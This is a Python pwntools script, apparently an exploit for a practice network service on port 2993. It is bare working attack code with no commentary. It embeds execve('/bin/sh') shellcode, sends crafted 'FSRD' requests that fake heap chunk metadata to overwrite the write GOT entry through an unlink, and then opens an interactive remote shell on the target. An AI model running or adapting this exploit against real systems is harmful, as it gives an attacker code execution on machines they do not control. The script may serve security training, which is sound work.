#!/usr/bin/env python

from pwn import *

writePLT = 0x804d41c
strlen = 128

def conn(ipAddr):
    sc = asm('xor ecx,ecx;mul ecx; push ecx; push 0x68732f2f ; push 0x6e69622f ; mov ebx, esp; mov al, 11; int 0x80')
    s = remote(ipAddr, 2993)
    firstChunk = "/ROOT/" + "/"*14 + "\xeb\x0e" + "AA" + p32(0xcafeBabe) + p32(0xdeadbeef) + p32(0x1dea1234) +  sc
    firstChunk += "/" *120
    
    secondChunk = "ROOT/" + p32(0xfffffffc) + p32(0xfffffffc) + p32(writePLT - 0xc) + p32(0x804e020)
    
    
    s.send("FSRD" + firstChunk[:strlen-4])
    
    s.send("FSRD" + secondChunk.ljust(strlen-4, '\x00'))
    s.interactive()
    s.close()

if len(sys.argv) < 2:
    print("usage: %s <ipAddr>")

else:
    conn(sys.argv[1])
